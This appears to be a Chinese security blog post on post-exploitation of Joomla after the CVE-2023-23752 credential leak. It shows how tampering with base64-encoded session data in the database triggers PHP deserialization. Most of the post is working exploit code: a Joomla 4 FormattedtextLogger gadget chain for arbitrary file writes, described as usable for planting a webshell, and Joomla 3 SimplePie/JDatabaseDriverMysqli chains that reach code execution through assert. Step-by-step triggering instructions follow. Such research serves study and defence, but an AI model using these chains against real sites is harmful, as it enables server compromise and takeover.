@@ -1,0 +1,145 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="e9117f5b127629267991011c32032dbf">前言</h1>
+<p>去年，joomla爆出信息泄漏漏洞CVE-2023-23752，可泄漏数据库账号密码，连上数据库，修改完管理员账号密码，最后发现后台登录页面访问不到，还能怎么利用呢？</p>
+<p>xss后台？其实，认真翻一下数据库就能找到更直接的答案</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083040-58928158-1bc0-1.png"/></p>
+<p>熟悉的php序列化数据，那是否可以修改该数据，然后反序列化呢？</p>
+<h1 data-content="1" id="bf4f1c9b505812c7cf665be85506b41f">joomla的session反序列化</h1>
+<p>joomla3.4.6之前，session默认直接存储在数据库中，修改即可反序列化，而从3.4.7开始，存储的格式又稍微有些变化，官方给session序列化的内容加了一层base64编码。</p>
+<p>这部分可查看<code>libraries/joomla/session/session.php</code>，3.4.7的代码中获取session数据base64解码后直接<code>unserialize(</code>，并没有限制数据的类型</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083050-5e38d85a-1bc0-1.png"/></p>
+<p>妥妥的可以反序列化，现在问题变成了寻找反序列化利用链</p>
+<h1 data-content="1" id="3ab7a5304db47907430d25fb009260fc">joomla4任意文件写入</h1>
+<p>以4.2.7的代码为例，全局搜索<code>__destruct(</code>,一共就6处，很快找到<code>libraries/src/Log/Logger/FormattedtextLogger.php</code>貌似有写文件的操作</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083101-65506df6-1bc0-1.png"/></p>
+<p>跟进<code>initFile()</code>函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083110-6a2d21de-1bc0-1.png"/></p>
+<p>该函数根据<code>$this-&gt;path</code>创建了目录，并将<code>$this-&gt;generateFileHeader()</code>的结果写入了<code>$this-&gt;path</code>文件中，跟进<code>generateFileHeader(</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083130-764983a4-1bc0-1.png"/></p>
+<p>在写入的内容中，<code>$this-&gt;format</code>可控，可用于写入webshell代码，只需保证<code>$this-&gt;options['text_file_no_php']</code>非空即可</p>
+<p>该任意文件写入的反序列化链很短，如下：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">Joomla\CMS\Log\Logger</span> <span class="p">{</span>
+    <span class="k">class</span> <span class="nc">FormattedtextLogger</span> <span class="p">{</span>
+        <span class="k">protected</span> <span class="nv">$defer</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="k">protected</span> <span class="nv">$deferredEntries</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'1'</span><span class="p">];</span>
+        <span class="k">protected</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/tmp/test.php'</span><span class="p">;</span>
+
+        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'text_file_no_php'</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">'1'</span><span class="p">]);</span>
+        <span class="k">protected</span> <span class="nv">$format</span> <span class="o">=</span> <span class="s1">'&lt;?php phpinfo();?&gt;'</span><span class="p">;</span>
+
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="p">{</span>
+    <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Joomla\CMS\Log\Logger\FormattedtextLogger</span><span class="p">();</span>
+    <span class="nv">$str</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">));</span>
+    <span class="k">echo</span> <span class="s2">"joomla|"</span><span class="o">.</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<h1 data-content="1" id="693368b69fd170b2517086d6f6df2457">joomla3任意函数执行rce</h1>
+<p>joomla 3.4.5出过一个经典的反序列化漏洞CVE-2015-8562，反序列化链如下:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">//header("Content-Type: text/plain");</span>
+<span class="k">class</span> <span class="nc">JSimplepieFactory</span> <span class="p">{</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">JDatabaseDriverMysql</span> <span class="p">{</span>
+
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">SimplePie</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$sanitize</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$cache</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$cache_name_function</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$javascript</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$feed_url</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">=</span> <span class="s2">"phpinfo();JFactory::getConfig();exit;"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">javascript</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="s2">"assert"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysql</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">JDatabaseDriverMysqli</span> <span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$disconnectHandlers</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSimplepieFactory</span><span class="p">();</span>
+        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="p">[</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">"init"</span><span class="p">],</span>
+        <span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysqli</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</pre></div>
+<p>利用链基于此修改即可，但也有些许变化以及一些注意的点</p>
+<p>首先，查看<code>libraries/joomla/database/driver/mysqli.php</code>代码，从3.4.6开始，<code>JDatabaseDriverMysqli</code>类的<code>disconnect()</code>函数中，不再单纯的只是判断<code>if($this-&gt;connection){</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083205-8afefb80-1bc0-1.png"/></p>
+<p>构造时采用<code>$this-&gt;connection=new mysqli('','','','');</code>即可</p>
+<p>其次，注意到在该漏洞中最终执行的php代码是<code>phpinfo();JFactory::getConfig();exit;</code>,如果少了<code>JFactory::getConfig()</code>漏洞便无法成功，为什么呢?</p>
+<p>问题原因在于<code>SimplePie</code>这个类的<code>init()</code>函数，最终会将<code>$this-&gt;feed_url</code>解析成uri，少了关键的<code>:</code>就过不了判断，所以这里修改利用时需要注意！</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083216-91e24d4e-1bc0-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083226-97fd2ff0-1bc0-1.png"/></p>
+<p>最后，改造出rce的反序列化利用链：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">JSimplepieFactory</span> <span class="p">{}</span>
+<span class="k">class</span> <span class="nc">SimplePie_Sanitize</span> <span class="p">{}</span>
+<span class="k">class</span> <span class="nc">SimplePie_Registry</span> <span class="p">{}</span>
+
+<span class="k">class</span> <span class="nc">SimplePie</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$sanitize</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$cache</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$cache_name_function</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$javascript</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$feed_url</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">=</span> <span class="s2">"phpinfo();JFactory::getConfig();exit;"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">javascript</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="s2">"assert"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie_Sanitize</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registry</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie_Registry</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">JDatabaseDriverMysqli</span> <span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$disconnectHandlers</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSimplepieFactory</span><span class="p">();</span>
+        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">''</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="p">[</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">"init"</span><span class="p">],</span>
+        <span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysqli</span><span class="p">();</span>
+<span class="nv">$str</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+<span class="k">echo</span> <span class="s2">"joomla|"</span><span class="o">.</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</pre></div>
+<h1 data-content="1" id="99cd1988f461ffdc5cca56a22bed8eb8">利用</h1>
+<p>访问joomla首页，返回cookie拿到<code>session_id</code>，修改<code>xxx_session</code>表中该<code>session_id</code>对应的<code>data</code>，带着cookie再次访问首页触发反序列化漏洞</p>
+<p>joomla4.2.7:<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083243-a19dfe36-1bc0-1.png"/></p>
+<p>joomla3.4.8:<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240527083300-ac149fb4-1bc0-1.png"/></p>
+<h1 data-content="1" id="67220465d43503c89281665bbc63978e">参考</h1>
+<p><a href="https://xz.aliyun.com/t/12175" target="_blank">https://xz.aliyun.com/t/12175</a><br/>
+<a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a></p>
+</div>
+</div>
